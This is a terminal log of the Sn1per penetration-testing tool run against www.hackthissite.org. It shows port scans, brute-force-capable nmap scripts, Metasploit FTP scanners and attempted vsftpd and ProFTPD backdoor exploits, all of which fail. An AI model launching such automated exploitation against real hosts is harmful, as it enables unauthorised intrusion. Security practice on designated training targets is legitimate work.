```sh
$ sniper --list

$ sniper -t www.hackthissite.org
>
[*] Loaded configuration file from /usr/share/sniper/sniper.conf [OK]   
[*] Loaded configuration file from /root/.sniper.conf [OK]
[*] Saving loot to /usr/share/sniper/loot/ [OK]
[*] Scanning www.hackthissite.org [OK]
[*] Checking for active internet connection [OK]
[*] Loaded configuration file from /usr/share/sniper/sniper.conf [OK]
[*] Loaded configuration file from /root/.sniper.conf [OK]
[*] Saving loot to /usr/share/sniper/loot/workspace/www.hackthissite.org
 [OK]
[*] Scanning www.hackthissite.org [OK]
                ____
    _________  /  _/___  ___  _____
   / ___/ __ \ / // __ \/ _ \/ ___/
  (__  ) / / // // /_/ /  __/ /
 /____/_/ /_/___/ .___/\___/_/
               /_/

 + -- --=[https://sn1persecurity.com
 + -- --=[Sn1per v9.2 by @xer0dayz

====================================================================================•x[2023-10-07](15:11)x•
 GATHERING DNS INFO
====================================================================================•x[2023-10-07](15:11)x•
====================================================================================•x[2023-10-07](15:11)x•
 CHECKING FOR SUBDOMAIN HIJACKING
====================================================================================•x[2023-10-07](15:11)x•

====================================================================================•x[2023-10-07](15:11)x•
 PINGING HOST
====================================================================================•x[2023-10-07](15:11)x•
PING www.hackthissite.org (137.74.187.100) 56(84) bytes of data.
64 bytes from 137.74.187.100 (137.74.187.100): icmp_seq=1 ttl=36 time=343 ms

--- www.hackthissite.org ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 343.093/343.093/343.093/0.000 ms

====================================================================================•x[2023-10-07](15:12)x•
 RUNNING TCP PORT SCAN
====================================================================================•x[2023-10-07](15:12)x•
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-10-07 15:12 UTC
Nmap scan report for www.hackthissite.org (137.74.187.100)
Host is up (0.84s latency).
Other addresses for www.hackthissite.org (not scanned): 137.74.187.104 137.74.187.101 137.74.187.102 137.74.187.103 ::ffff:137.74.187.100 ::ffff:137.74.187.104 ::ffff:137.74.187.101 ::ffff:137.74.187.102 ::ffff:137.74.187.103

PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
23/tcp    open  telnet
25/tcp    open  smtp
53/tcp    open  domain
67/tcp    open  dhcps
68/tcp    open  dhcpc
69/tcp    open  tftp
79/tcp    open  finger
80/tcp    open  http
110/tcp   open  pop3
111/tcp   open  rpcbind
123/tcp   open  ntp
135/tcp   open  msrpc
137/tcp   open  netbios-ns
139/tcp   open  netbios-ssn
161/tcp   open  snmp
162/tcp   open  snmptrap
264/tcp   open  bgmp
389/tcp   open  ldap
443/tcp   open  https
445/tcp   open  microsoft-ds
500/tcp   open  isakmp
512/tcp   open  exec
513/tcp   open  login
514/tcp   open  shell
623/tcp   open  oob-ws-http
624/tcp   open  cryptoadmin
1099/tcp  open  rmiregistry
1433/tcp  open  ms-sql-s
1524/tcp  open  ingreslock
2049/tcp  open  nfs
2121/tcp  open  ccproxy-ftp
2181/tcp  open  eforward
3128/tcp  open  squid-http
3306/tcp  open  mysql
3310/tcp  open  dyna-access
3389/tcp  open  ms-wbt-server
3632/tcp  open  distccd
4443/tcp  open  pharos
5432/tcp  open  postgresql
5555/tcp  open  freeciv
5800/tcp  open  vnc-http
5900/tcp  open  vnc
5984/tcp  open  couchdb
6667/tcp  open  irc
7001/tcp  open  afs3-callback
8000/tcp  open  http-alt
8001/tcp  open  vcom-tunnel
8080/tcp  open  http-proxy
8180/tcp  open  unknown
8443/tcp  open  https-alt
8888/tcp  open  sun-answerbook
9200/tcp  open  wap-wsp
9495/tcp  open  unknown
10000/tcp open  snet-sensor-mgmt
16992/tcp open  amt-soap-http
27017/tcp open  mongod
27018/tcp open  mongod
27019/tcp open  mongod
28017/tcp open  mongod
49152/tcp open  unknown
49180/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 2.88 seconds

====================================================================================•x[2023-10-07](15:12)x•
 RUNNING INTRUSIVE SCANS
====================================================================================•x[2023-10-07](15:12)x•
 + -- --=[Port 21 opened... running tests...
====================================================================================•x[2023-10-07](15:12)x•
 RUNNING NMAP SCRIPTS
====================================================================================•x[2023-10-07](15:12)x•
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-10-07 15:12 UTC
NSE: Loaded 55 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 15:12
Completed NSE at 15:12, 0.00s elapsed
Initiating NSE at 15:12
Completed NSE at 15:12, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 15:12
Completed Parallel DNS resolution of 1 host. at 15:12, 0.00s elapsed    
Initiating SYN Stealth Scan at 15:12
Scanning www.hackthissite.org (137.74.187.100) [1 port]
Discovered open port 21/tcp on 137.74.187.100
Completed SYN Stealth Scan at 15:12, 0.24s elapsed (1 total ports)      
Initiating Service scan at 15:12
Scanning 1 service on www.hackthissite.org (137.74.187.100)
Completed Service scan at 15:14, 171.27s elapsed (1 service on 1 host)  
Initiating OS detection (try #1) against www.hackthissite.org (137.74.187.100)
adjust_timeouts2: packet supposedly had rtt of -762581 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -762581 microseconds.  Ignoring time.
Retrying OS detection (try #2) against www.hackthissite.org (137.74.187.100)
adjust_timeouts2: packet supposedly had rtt of -801193 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -801193 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -778741 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -778741 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -802490 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -802490 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -808911 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -808911 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -800015 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -800015 microseconds.  Ignoring time.
Initiating Traceroute at 15:15
Completed Traceroute at 15:15, 0.33s elapsed
Initiating Parallel DNS resolution of 3 hosts. at 15:15
Completed Parallel DNS resolution of 3 hosts. at 15:15, 11.30s elapsed
NSE: Script scanning 137.74.187.100.
Initiating NSE at 15:15
NSE Timing: About 71.23% done; ETC: 15:17 (0:00:30 remaining)
Completed NSE at 15:16, 90.93s elapsed
Initiating NSE at 15:16
Completed NSE at 15:16, 1.92s elapsed
Nmap scan report for www.hackthissite.org (137.74.187.100)
Host is up (0.23s latency).
Other addresses for www.hackthissite.org (not scanned): ::ffff:137.74.187.100 ::ffff:137.74.187.104 ::ffff:137.74.187.101 ::ffff:137.74.187.102 ::ffff:137.74.187.103 137.74.187.104 137.74.187.101 137.74.187.102 137.74.187.103

PORT   STATE SERVICE VERSION
21/tcp open  ftp?
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 3 hops
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: All zeros

TRACEROUTE (using port 21/tcp)
HOP RTT       ADDRESS
1   0.17 ms   172.17.0.1
2   0.04 ms   192.168.65.5
3   326.40 ms 137.74.187.100

NSE: Script Post-scanning.
Initiating NSE at 15:16
Completed NSE at 15:16, 0.00s elapsed
Initiating NSE at 15:16
Completed NSE at 15:16, 0.00s elapsed
Read data files from: /usr/local/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 288.74 seconds
           Raw packets sent: 82 (7.858KB) | Rcvd: 86 (3.976KB)
====================================================================================•x[2023-10-07](15:16)x•
 RUNNING METASPLOIT FTP VERSION SCANNER
====================================================================================•x[2023-10-07](15:16)x•
RHOST => www.hackthissite.org
RHOSTS => www.hackthissite.org
[*] www.hackthissite.org:21 - Scanned  1 of 10 hosts (10% complete)     
[*] www.hackthissite.org:21 - Scanned  2 of 10 hosts (20% complete)     
[*] www.hackthissite.org:21 - Scanned  3 of 10 hosts (30% complete)     
[*] www.hackthissite.org:21 - Scanned  4 of 10 hosts (40% complete)     
[*] www.hackthissite.org:21 - Scanned  5 of 10 hosts (50% complete)     
[*] www.hackthissite.org:21 - Scanned  6 of 10 hosts (60% complete)     
[*] www.hackthissite.org:21 - Scanned  7 of 10 hosts (70% complete)     
[*] www.hackthissite.org:21 - Scanned  8 of 10 hosts (80% complete)     
[*] www.hackthissite.org:21 - Scanned  9 of 10 hosts (90% complete)     
[*] www.hackthissite.org:21 - Scanned 10 of 10 hosts (100% complete)    
[*] Auxiliary module execution completed
====================================================================================•x[2023-10-07](15:19)x•
 RUNNING METASPLOIT ANONYMOUS FTP SCANNER
====================================================================================•x[2023-10-07](15:19)x•
RHOST => www.hackthissite.org
RHOSTS => www.hackthissite.org
[*] www.hackthissite.org:21 - Scanned  1 of 10 hosts (10% complete)
[*] www.hackthissite.org:21 - Scanned  2 of 10 hosts (20% complete)
[*] www.hackthissite.org:21 - Scanned  3 of 10 hosts (30% complete)
[*] www.hackthissite.org:21 - Scanned  4 of 10 hosts (40% complete)
[*] www.hackthissite.org:21 - Scanned  5 of 10 hosts (50% complete)
[*] www.hackthissite.org:21 - Scanned  6 of 10 hosts (60% complete)
[*] www.hackthissite.org:21 - Scanned  7 of 10 hosts (70% complete)
[*] www.hackthissite.org:21 - Scanned  8 of 10 hosts (80% complete)
[*] www.hackthissite.org:21 - Scanned  9 of 10 hosts (90% complete)
[*] www.hackthissite.org:21 - Scanned 10 of 10 hosts (100% complete)
[*] Auxiliary module execution completed
====================================================================================•x[2023-10-07](15:25)x•
 RUNNING VSFTPD 2.3.4 BACKDOOR EXPLOIT
====================================================================================•x[2023-10-07](15:25)x•
RHOST => www.hackthissite.org
RHOSTS => www.hackthissite.org
LHOST => 127.0.0.1
LPORT => 4444
[*] No payload configured, defaulting to cmd/unix/interact
[*] Exploiting target ::ffff:894a:bb64
[*] ::ffff:894a:bb64:21 - The port used by the backdoor bind listener is already open
[-] ::ffff:894a:bb64:21 - The service on port 6200 does not appear to be a shell
[*] Exploiting target ::ffff:894a:bb68
[*] ::ffff:894a:bb68:21 - The port used by the backdoor bind listener is already open
[-] ::ffff:894a:bb68:21 - The service on port 6200 does not appear to be a shell
[*] Exploiting target ::ffff:894a:bb65
[*] ::ffff:894a:bb65:21 - The port used by the backdoor bind listener is already open
[-] ::ffff:894a:bb65:21 - The service on port 6200 does not appear to be a shell
[*] Exploiting target ::ffff:894a:bb66
[*] ::ffff:894a:bb66:21 - The port used by the backdoor bind listener is already open
[-] ::ffff:894a:bb66:21 - The service on port 6200 does not appear to be a shell
[*] Exploiting target ::ffff:894a:bb67
[*] ::ffff:894a:bb67:21 - The port used by the backdoor bind listener is already open
[-] ::ffff:894a:bb67:21 - The service on port 6200 does not appear to be a shell
[*] Exploiting target 137.74.187.100
[*] 137.74.187.100:21 - The port used by the backdoor bind listener is already open
[-] 137.74.187.100:21 - The service on port 6200 does not appear to be a shell
[*] Exploiting target 137.74.187.104
[*] 137.74.187.104:21 - The port used by the backdoor bind listener is already open
[-] 137.74.187.104:21 - The service on port 6200 does not appear to be a shell
[*] Exploiting target 137.74.187.101
[*] 137.74.187.101:21 - The port used by the backdoor bind listener is already open
[-] 137.74.187.101:21 - The service on port 6200 does not appear to be a shell
[*] Exploiting target 137.74.187.102
[*] 137.74.187.102:21 - The port used by the backdoor bind listener is already open
[-] 137.74.187.102:21 - The service on port 6200 does not appear to be a shell
[*] Exploiting target 137.74.187.103
[*] 137.74.187.103:21 - The port used by the backdoor bind listener is already open
[-] 137.74.187.103:21 - The service on port 6200 does not appear to be a shell
[*] Exploit completed, but no session was created.
====================================================================================•x[2023-10-07](15:27)x•
 RUNNING PROFTPD 1.3.3C BACKDOOR EXPLOIT
====================================================================================•x[2023-10-07](15:27)x•
RHOST => www.hackthissite.org
RHOSTS => www.hackthissite.org
LHOST => 127.0.0.1
LPORT => 4444
[*] Exploiting target ::ffff:894a:bb64
[-] ::ffff:894a:bb64:21 - Exploit failed: A payload has not been selected.
[*] Exploiting target ::ffff:894a:bb68
[-] ::ffff:894a:bb68:21 - Exploit failed: A payload has not been selected.
[*] Exploiting target ::ffff:894a:bb65
[-] ::ffff:894a:bb65:21 - Exploit failed: A payload has not been selected.
[*] Exploiting target ::ffff:894a:bb66
[-] ::ffff:894a:bb66:21 - Exploit failed: A payload has not been selected.
[*] Exploiting target ::ffff:894a:bb67
[-] ::ffff:894a:bb67:21 - Exploit failed: A payload has not been selected.
[*] Exploiting target 137.74.187.100
[-] 137.74.187.100:21 - Exploit failed: A payload has not been selected.
[*] Exploiting target 137.74.187.104
[-] 137.74.187.104:21 - Exploit failed: A payload has not been selected.
[*] Exploiting target 137.74.187.101
[-] 137.74.187.101:21 - Exploit failed: A payload has not been selected.
[*] Exploiting target 137.74.187.102
[-] 137.74.187.102:21 - Exploit failed: A payload has not been selected.
[*] Exploiting target 137.74.187.103
[-] 137.74.187.103:21 - Exploit failed: A payload has not been selected.
[*] Exploit completed, but no session was created.
 + -- --=[Port 22 opened... running tests...
====================================================================================•x[2023-10-07](15:27)x•
 RUNNING SSH AUDIT
====================================================================================•x[2023-10-07](15:27)x•
[exception] did not receive banner.
====================================================================================•x[2023-10-07](15:27)x•
 RUNNING NMAP SCRIPTS
====================================================================================•x[2023-10-07](15:27)x•
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-10-07 15:27 UTC
NSE: Loaded 52 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 15:27
Completed NSE at 15:27, 0.00s elapsed
Initiating NSE at 15:27
Completed NSE at 15:27, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 15:27
Completed Parallel DNS resolution of 1 host. at 15:27, 0.20s elapsed
Initiating SYN Stealth Scan at 15:27
Scanning www.hackthissite.org (137.74.187.100) [1 port]
Discovered open port 22/tcp on 137.74.187.100
Completed SYN Stealth Scan at 15:27, 0.23s elapsed (1 total ports)      
Initiating Service scan at 15:27
Scanning 1 service on www.hackthissite.org (137.74.187.100)
Completed Service scan at 15:27, 0.54s elapsed (1 service on 1 host)    
Initiating OS detection (try #1) against www.hackthissite.org (137.74.187.100)
adjust_timeouts2: packet supposedly had rtt of -620529 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -620529 microseconds.  Ignoring time.
Retrying OS detection (try #2) against www.hackthissite.org (137.74.187.100)
adjust_timeouts2: packet supposedly had rtt of -627155 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -627155 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -633223 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -633223 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -622923 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -622923 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -627390 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -627390 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -618469 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -618469 microseconds.  Ignoring time.
Initiating Traceroute at 15:27
Completed Traceroute at 15:27, 0.20s elapsed
Initiating Parallel DNS resolution of 3 hosts. at 15:27
Completed Parallel DNS resolution of 3 hosts. at 15:28, 11.32s elapsed
NSE: Script scanning 137.74.187.100.
Initiating NSE at 15:28
Completed NSE at 15:28, 31.21s elapsed
Initiating NSE at 15:28
Completed NSE at 15:28, 0.00s elapsed
Nmap scan report for www.hackthissite.org (137.74.187.100)
Host is up (0.18s latency).
Other addresses for www.hackthissite.org (not scanned): ::ffff:137.74.187.100 ::ffff:137.74.187.104 ::ffff:137.74.187.101 ::ffff:137.74.187.102 ::ffff:137.74.187.103 137.74.187.104 137.74.187.101 137.74.187.102 137.74.187.103

PORT   STATE SERVICE    VERSION
22/tcp open  tcpwrapped
|_ssh-auth-methods: ERROR: Script execution failed (use -d to debug)    
|_ssh-publickey-acceptance: ERROR: Script execution failed (use -d to debug)
|_ssh-brute: ERROR: Script execution failed (use -d to debug)
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
|_ssh-run: ERROR: Script execution failed (use -d to debug)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 3 hops
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: All zeros

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   0.01 ms   172.17.0.1
2   0.02 ms   192.168.65.5
3   191.10 ms 137.74.187.100

NSE: Script Post-scanning.
Initiating NSE at 15:28
Completed NSE at 15:28, 0.00s elapsed
Initiating NSE at 15:28
Completed NSE at 15:28, 0.00s elapsed
Read data files from: /usr/local/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 56.07 seconds
           Raw packets sent: 82 (7.858KB) | Rcvd: 85 (3.928KB)
====================================================================================•x[2023-10-07](15:28)x•
 RUNNING SSH VERSION SCANNER
====================================================================================•x[2023-10-07](15:28)x•
USER_FILE => /usr/share/brutex/wordlists/simple-users.txt
RHOSTS => www.hackthissite.org
RHOST => www.hackthissite.org
[*] www.hackthissite.org:22 - Scanned  1 of 10 hosts (10% complete)
[*] www.hackthissite.org:22 - Scanned  2 of 10 hosts (20% complete)
[*] www.hackthissite.org:22 - Scanned  3 of 10 hosts (30% complete)
[*] www.hackthissite.org:22 - Scanned  4 of 10 hosts (40% complete)
[*] www.hackthissite.org:22 - Scanned  5 of 10 hosts (50% complete)
[*] www.hackthissite.org:22 - Scanned  6 of 10 hosts (60% complete)
[*] www.hackthissite.org:22 - Scanned  7 of 10 hosts (70% complete)
[*] www.hackthissite.org:22 - Scanned  8 of 10 hosts (80% complete)
[*] www.hackthissite.org:22 - Scanned  9 of 10 hosts (90% complete)
[*] www.hackthissite.org:22 - Scanned 10 of 10 hosts (100% complete)
[*] Auxiliary module execution completed
```